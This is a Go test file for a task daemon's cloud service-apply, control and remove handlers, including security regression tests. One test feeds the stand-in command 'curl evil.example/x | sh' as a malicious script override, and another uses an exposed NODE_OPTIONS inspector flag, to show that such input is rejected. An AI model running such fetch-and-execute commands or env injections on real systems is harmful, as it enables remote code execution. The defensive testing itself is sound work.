// SPDX-FileCopyrightText: PoppyCake, s.r.o.
// SPDX-License-Identifier: GPL-3.0-or-later

package cloud

import (
	"encoding/json"
	"errors"
	"testing"
	"time"

	"github.com/runwisp/runwisp/internal/config"
	"github.com/runwisp/runwisp/internal/executor"
	"github.com/runwisp/runwisp/internal/generated/protocol"
	"github.com/runwisp/runwisp/internal/model"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func shellAvailable() executor.Availability {
	return executor.Availability{Shell: executor.BackendStatus{Available: true}}
}

func TestHandleServiceApply_UpsertsServiceTask(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)
	backoff := protocol.ServiceRestartBackoffExponential

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Type: "service:apply",
		Service: &protocol.Service{
			TaskID:            "svc-1",
			TaskName:          "My Service",
			Script:            shellScript(t, "sleep 1"),
			Instances:         3,
			Autostart:         true,
			RestartDelay:      2000,
			RestartBackoff:    &backoff,
			BackoffResetAfter: 60000,
			TaskConfig: &protocol.ServiceTaskConfig{
				Env:          map[string]string{"FOO": "bar"},
				GracefulStop: 5000,
			},
		},
	})
	require.NoError(t, err)

	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	assert.Equal(t, model.KindService, task.Kind)
	assert.Equal(t, model.RestartAlways, task.Restart)
	assert.Equal(t, 3, task.Instances)
	assert.Equal(t, 3, task.MaxConcurrent)
	assert.Equal(t, model.BackoffExponential, task.RestartBackoff)
	assert.Equal(t, "bar", task.Env["FOO"])
	// autostart=true brings the service up to its desired count.
	assert.Equal(t, []string{task.Name}, runner.startedServices)
}

func TestHandleServiceApply_NoAutostartDoesNotStart(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "svc-2",
			TaskName:  "svc-2",
			Script:    shellScript(t, "sleep 1"),
			Instances: 1,
			Autostart: false,
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	assert.Empty(t, runner.startedServices)
}

func TestHandleServiceApply_UnavailableBackendRejected(t *testing.T) {
	h := newDispatchHandler(executor.Availability{}, nil)
	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "svc", TaskName: "svc", Script: shellScript(t, "x"), Instances: 1},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
}

// TestHandleServiceApply_HTTPRejectedWithoutDispatch confirms an HTTP-type
// cloud-created service is gated by allow_cloud_dispatch just like
// shell/container/compose: HTTP still makes a peer-directed network call and a
// persistent auto-restarting service, so it is not exempt from the opt-in.
func TestHandleServiceApply_HTTPRejectedWithoutDispatch(t *testing.T) {
	avail := executor.Availability{
		HTTP: executor.BackendStatus{Available: false, Reason: "cloud dispatch disabled (set [daemon] allow_cloud_dispatch = true to enable)"},
	}
	h := newDispatchHandler(avail, nil)
	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "svc-http", TaskName: "svc-http", Script: httpScript(t, "https://example.com"), Instances: 1},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
}

// TestHandleServiceApply_HTTPAllowedWithDispatch confirms HTTP-type service
// creation succeeds once the operator opts in via allow_cloud_dispatch.
func TestHandleServiceApply_HTTPAllowedWithDispatch(t *testing.T) {
	h := newDispatchHandler(executor.Availability{HTTP: executor.BackendStatus{Available: true}}, nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "svc-http", TaskName: "svc-http", Script: httpScript(t, "https://example.com"), Instances: 1},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	assert.Equal(t, model.KindService, runner.upserted[0].Kind)
}

func TestHandleServiceApply_MissingServiceRejected(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	err := h.HandleServiceApply(protocol.ServiceApplyMessage{})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

func TestHandleServiceControl_RoutesActions(t *testing.T) {
	start, stop, restart := protocol.ActionStart, protocol.ActionStop, protocol.ActionRestart
	cases := []struct {
		action *protocol.Action
		assert func(t *testing.T, r *fakeTaskRunner, name string)
	}{
		{&start, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.startedServices) }},
		{&stop, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.stoppedServices) }},
		{&restart, func(t *testing.T, r *fakeTaskRunner, name string) {
			assert.Equal(t, []string{name}, r.restartedServices)
		}},
	}
	for _, tc := range cases {
		h := newDispatchHandler(shellAvailable(), nil)
		runner := h.taskManager.(*fakeTaskRunner)
		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: tc.action})
		require.NoError(t, err)
		tc.assert(t, runner, sanitizeCloudTaskName("svc-1"))
	}
}

func TestHandleServiceControl_MissingActionRejected(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1"})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

func TestHandleServiceControl_MissingTaskIDRejected(t *testing.T) {
	start := protocol.ActionStart
	h := newDispatchHandler(shellAvailable(), nil)
	err := h.HandleServiceControl(protocol.ServiceControlMessage{Action: &start})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

func TestHandleServiceControl_UnknownActionRejected(t *testing.T) {
	// An Action value outside the generated enum range decodes to a nil Value(),
	// which the handler treats as an unknown action (validation error) rather
	// than silently doing nothing.
	unknown := protocol.Action(99)
	h := newDispatchHandler(shellAvailable(), nil)
	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: &unknown})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

func TestHandleServiceControl_RunnerErrorIsConflict(t *testing.T) {
	start := protocol.ActionStart
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)
	runner.serviceErr = errors.New("already running")

	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: &start})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
}

func TestHandleServiceApply_AutostartStartErrorIsConflict(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)
	runner.serviceErr = errors.New("port in use")

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "svc", TaskName: "svc", Script: shellScript(t, "x"), Instances: 1, Autostart: true},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
}

func TestHandleServiceApply_InvalidScriptRejected(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "svc", Script: json.RawMessage(`not-json`), Instances: 1},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

// Covers buildServiceTask's name fallbacks and defaults: an empty taskId falls
// back to taskName, a sub-one instance count is clamped to 1, and the optional
// logOnFull knob is overlaid onto the task.
func TestHandleServiceApply_NameFallbackAndDefaults(t *testing.T) {
	logOnFull := protocol.ServiceTaskConfigLogOnFullKill
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskName:   "Fallback Svc",
			Script:     shellScript(t, "sleep 1"),
			Instances:  0, // clamped to 1
			TaskConfig: &protocol.ServiceTaskConfig{LogOnFull: &logOnFull},
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	assert.Equal(t, "cloud-Fallback_Svc", task.Name)
	assert.Equal(t, 1, task.Instances)
	assert.Equal(t, "kill", task.LogOnFull)
}

func TestHandleServiceApply_DefaultsToCloudServiceName(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{Script: shellScript(t, "sleep 1"), Instances: 1},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	assert.Equal(t, "cloud-service", runner.upserted[0].Name)
}

// A service:apply addressed by the bare name of a synced TOML service merges the
// present fields onto the live definition: TOML-only fields (working_dir,
// depends_on) survive, the absent script leaves the real exec def intact, and
// the override path never starts the service (control owns running/stopped).
func TestHandleServiceApply_MergesOntoExistingTOMLService(t *testing.T) {
	origExec := &model.ShellExecution{Script: "heartbeat.sh"}
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		WorkingDir:    "/srv/app",
		DependsOn:     []string{"pg"},
		ExecutionDef:  origExec,
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "heartbeat",
			TaskName:  "heartbeat",
			Instances: 3,
			Autostart: true, // ignored on the merge path
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	assert.Equal(t, "heartbeat", task.Name)
	assert.Equal(t, 3, task.Instances)
	assert.Equal(t, 3, task.MaxConcurrent)
	assert.Equal(t, "/srv/app", task.WorkingDir, "TOML-only field must be preserved")
	assert.Equal(t, []string{"pg"}, task.DependsOn, "TOML-only field must be preserved")
	assert.Same(t, origExec, task.ExecutionDef, "absent script must leave the exec def untouched")
	assert.Empty(t, runner.startedServices, "merge path must not start the service")
}

// The cloud's Script field is non-omitempty on the wire, so a synced service
// with no command override arrives as the JSON literal `null`, not an absent
// field. The merge must treat that exactly like an absent script — keep the live
// TOML command — rather than feed `null` to ParseExecutionDef (which rejects it
// and would fail every reconnect re-apply).
func TestHandleServiceApply_MergeKeepsCommandOnNullScript(t *testing.T) {
	origExec := &model.ShellExecution{Script: "heartbeat.sh"}
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  origExec,
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "heartbeat",
			TaskName:  "heartbeat",
			Script:    json.RawMessage("null"),
			Instances: 2,
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	assert.Same(t, origExec, task.ExecutionDef, "null script must leave the live command untouched")
	assert.Equal(t, 2, task.Instances, "other overlaid fields must still apply")
}

// When the payload carries a script (the operator overrode the command), the
// merge replaces the exec def while still preserving the rest of the definition.
func TestHandleServiceApply_MergeAppliesOverriddenScript(t *testing.T) {
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		WorkingDir:    "/srv/app",
		ExecutionDef:  &model.ShellExecution{Script: "old.sh"},
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID: "heartbeat",
			Script: shellScript(t, "new.sh"),
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	shell, ok := task.ExecutionDef.(*model.ShellExecution)
	require.True(t, ok)
	assert.Equal(t, "new.sh", shell.Script)
	assert.Equal(t, "/srv/app", task.WorkingDir, "TOML-only field must survive a script override")
}

// A merge overlays the present restart knobs (restartDelay, backoffResetAfter →
// HealthyAfter, restartBackoff) onto the live definition; absent/zero fields are
// left as they were.
func TestHandleServiceApply_MergeOverlaysRestartFields(t *testing.T) {
	backoff := protocol.ServiceRestartBackoffExponential
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  &model.ShellExecution{Script: "heartbeat.sh"},
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:            "heartbeat",
			TaskName:          "heartbeat",
			RestartDelay:      2000,
			BackoffResetAfter: 60000,
			RestartBackoff:    &backoff,
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	task := runner.upserted[0]
	assert.Equal(t, 2*time.Second, task.RestartDelay)
	assert.Equal(t, time.Minute, task.HealthyAfter)
	assert.Equal(t, model.BackoffExponential, task.RestartBackoff)
}

// An unparseable script override on the merge path surfaces as a validation
// error (and propagates out of HandleServiceApply) rather than clobbering the
// live definition.
func TestHandleServiceApply_MergeInvalidScriptOverrideRejected(t *testing.T) {
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  &model.ShellExecution{Script: "heartbeat.sh"},
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "heartbeat", Script: json.RawMessage("not-json")},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
}

// A script override whose execution type has no available backend is a conflict
// on the merge path, mirroring the build path.
func TestHandleServiceApply_MergeUnavailableBackendRejected(t *testing.T) {
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  &model.ShellExecution{Script: "heartbeat.sh"},
	}
	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"heartbeat": existing})

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{TaskID: "heartbeat", Script: shellScript(t, "new.sh")},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
}

// Regression: a peer must not reshape the spawn environment of a TOML-defined
// service while allow_cloud_dispatch is off. env can change what a disk-defined
// command actually executes (NODE_OPTIONS, GIT_SSH_COMMAND, *_proxy) and it
// overlays on top of the inherited env, so it belongs on the same availability
// gate as a script override. Before the fix the gate was only consulted when the
// payload carried a script — and the cloud sends script: null for synced TOML
// services — so taskConfig.env sailed straight through.
//
// The fixture carries Run, not ExecutionDef, because that is what config.Load
// produces for a plain `[services.web] run = "..."` — the loader only fills
// ExecutionDef for compose-backed units. An ExecutionDef fixture hid a nil
// dereference in the gate: the one shape it exists to protect was the one shape
// that crashed the daemon instead of returning a verdict.
func TestHandleServiceApply_MergeEnvGatedOnAvailability(t *testing.T) {
	existing := &model.Task{
		Name:          "web",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		Env:           map[string]string{"NODE_ENV": "production"},
		Run:           "node server.js",
	}
	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"web": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:   "web",
			TaskName: "web",
			Script:   json.RawMessage("null"),
			TaskConfig: &protocol.ServiceTaskConfig{
				Env: map[string]string{"NODE_OPTIONS": "--inspect=0.0.0.0:9229"},
			},
		},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
	assert.Empty(t, runner.upserted, "a rejected env override must not reach the task set")
	assert.Equal(t, map[string]string{"NODE_ENV": "production"}, existing.Env,
		"the operator's env must be left intact")
}

// The same merge with the backend available is the legitimate case and must
// still apply. Guards against over-gating the fix above.
func TestHandleServiceApply_MergeEnvAppliedWhenAvailable(t *testing.T) {
	existing := &model.Task{
		Name:          "web",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		Run:           "node server.js",
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"web": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:     "web",
			TaskName:   "web",
			Script:     json.RawMessage("null"),
			TaskConfig: &protocol.ServiceTaskConfig{Env: map[string]string{"LOG_LEVEL": "debug"}},
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	assert.Equal(t, "debug", runner.upserted[0].Env["LOG_LEVEL"])
}

// A merge that carries no env at all must not be gated: the instances/restart/log
// knobs are what the cloud re-asserts on every reconnect, and gating those would
// break sync on a dispatch-off daemon.
func TestHandleServiceApply_MergeWithoutEnvNotGated(t *testing.T) {
	existing := &model.Task{
		Name:          "web",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  &model.ShellExecution{Script: "node server.js"},
	}
	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"web": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "web",
			TaskName:  "web",
			Script:    json.RawMessage("null"),
			Instances: 2,
		},
	})
	require.NoError(t, err)
	require.Len(t, runner.upserted, 1)
	assert.Equal(t, 2, runner.upserted[0].Instances)
}

// A service with neither Run nor ExecutionDef has nothing to check the env
// override against, so the gate refuses it rather than waving it through on the
// absence of a type to gate.
func TestHandleServiceApply_MergeEnvRefusedWithoutExecutionDefinition(t *testing.T) {
	existing := &model.Task{
		Name:          "web",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"web": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:     "web",
			TaskName:   "web",
			Script:     json.RawMessage("null"),
			TaskConfig: &protocol.ServiceTaskConfig{Env: map[string]string{"NODE_OPTIONS": "--inspect"}},
		},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindConflict, ce.Kind)
	assert.Empty(t, runner.upserted)
}

// Regression (Bug 1): a service:apply addressed by the bare name of a
// *non-service* TOML task (a cron/one-shot) must be rejected outright and must
// never overwrite that task's disk-defined run=. Before the fix, resolveServiceTarget
// matched any task by name, so mergeServiceApply clobbered the ExecutionDef of an
// ordinary task — a control-plane peer could rewrite what a task executes,
// violating the "run= comes from disk only" invariant.
func TestHandleServiceApply_RejectsNonServiceTaskCollision(t *testing.T) {
	origExec := &model.ShellExecution{Script: "backup.sh"}
	cron := &model.Task{
		Name:         "backup",
		Kind:         model.KindTask,
		ExecutionDef: origExec,
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "backup",
			TaskName:  "backup",
			Script:    shellScript(t, "curl evil.example/x | sh"),
			Instances: 1,
		},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
	assert.Empty(t, runner.upserted, "a colliding non-service name must not upsert")
	assert.Same(t, origExec, cron.ExecutionDef, "the cron task's run= must be left untouched")
}

// Regression (Bug 1): service:control must likewise refuse to target a
// non-service task, so the control plane can't drive the lifecycle of a cron task.
func TestHandleServiceControl_RejectsNonServiceTaskCollision(t *testing.T) {
	start := protocol.ActionStart
	cron := &model.Task{Name: "backup", Kind: model.KindTask, ExecutionDef: &model.ShellExecution{Script: "backup.sh"}}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "backup", Action: &start})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
	assert.Empty(t, runner.startedServices)
}

// Regression (Bug 4c): the build path must reject an instance count above
// config.MaxServiceInstances (mirroring the TOML cap) instead of registering an
// unbounded fleet.
func TestHandleServiceApply_RejectsInstanceCountAboveCap(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "svc",
			TaskName:  "svc",
			Script:    shellScript(t, "sleep 1"),
			Instances: config.MaxServiceInstances + 1,
		},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
	assert.Empty(t, runner.upserted, "an over-cap apply must not register the task")
}

// Regression (Bug 4c): the merge path enforces the same cap and leaves the live
// definition unchanged when the payload asks for too many instances.
func TestHandleServiceApply_MergeRejectsInstanceCountAboveCap(t *testing.T) {
	existing := &model.Task{
		Name:          "heartbeat",
		Kind:          model.KindService,
		Restart:       model.RestartAlways,
		Instances:     1,
		MaxConcurrent: 1,
		ExecutionDef:  &model.ShellExecution{Script: "heartbeat.sh"},
	}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})

	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
		Service: &protocol.Service{
			TaskID:    "heartbeat",
			TaskName:  "heartbeat",
			Instances: config.MaxServiceInstances + 1,
		},
	})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
	assert.Equal(t, 1, existing.Instances, "an over-cap merge must not rescale the live service")
}

// Regression (Bug 7): service:remove tears down a previously declared service by
// dropping its task from the runner, so a cloud-managed service no longer leaks a
// taskState + supervisor goroutine once the control plane retires it.
func TestHandleServiceRemove_DropsExistingService(t *testing.T) {
	existing := &model.Task{Name: "heartbeat", Kind: model.KindService, ExecutionDef: &model.ShellExecution{Script: "heartbeat.sh"}}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "heartbeat"})
	require.NoError(t, err)
	assert.Equal(t, []string{"heartbeat"}, runner.removed)
}

// Regression (Bug 7 / Bug 1): service:remove must refuse to delete a non-service
// TOML task even if its name is supplied.
func TestHandleServiceRemove_RejectsNonServiceTask(t *testing.T) {
	cron := &model.Task{Name: "backup", Kind: model.KindTask, ExecutionDef: &model.ShellExecution{Script: "backup.sh"}}
	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "backup"})
	require.Error(t, err)
	var ce *CloudError
	require.ErrorAs(t, err, &ce)
	assert.Equal(t, CloudErrorKindValidation, ce.Kind)
	assert.Empty(t, runner.removed, "a non-service task must never be removed")
}

// A remove for a service that isn't registered is a no-op: the desired end state
// (service gone) already holds, so it must not error.
func TestHandleServiceRemove_UnknownTaskIsNoop(t *testing.T) {
	h := newDispatchHandler(shellAvailable(), nil)
	runner := h.taskManager.(*fakeTaskRunner)

	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "01JMISSING0000000000000000"})
	require.NoError(t, err)
	assert.Empty(t, runner.removed)
}

// HandleServiceControl resolves a synced TOML service by its bare name and a
// cloud-declared service by its ULID (→ cloud-<id>), so both addressing schemes
// reach the supervisor.
func TestHandleServiceControl_ResolvesBareNameAndCloudID(t *testing.T) {
	start := protocol.ActionStart

	t.Run("bare name of a synced service", func(t *testing.T) {
		existing := &model.Task{Name: "heartbeat", Kind: model.KindService}
		h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
		runner := h.taskManager.(*fakeTaskRunner)
		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "heartbeat", Action: &start})
		require.NoError(t, err)
		assert.Equal(t, []string{"heartbeat"}, runner.startedServices)
	})

	t.Run("ULID of a cloud-declared service", func(t *testing.T) {
		h := newDispatchHandler(shellAvailable(), nil)
		runner := h.taskManager.(*fakeTaskRunner)
		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: &start})
		require.NoError(t, err)
		assert.Equal(t, []string{"cloud-svc-1"}, runner.startedServices)
	})
}
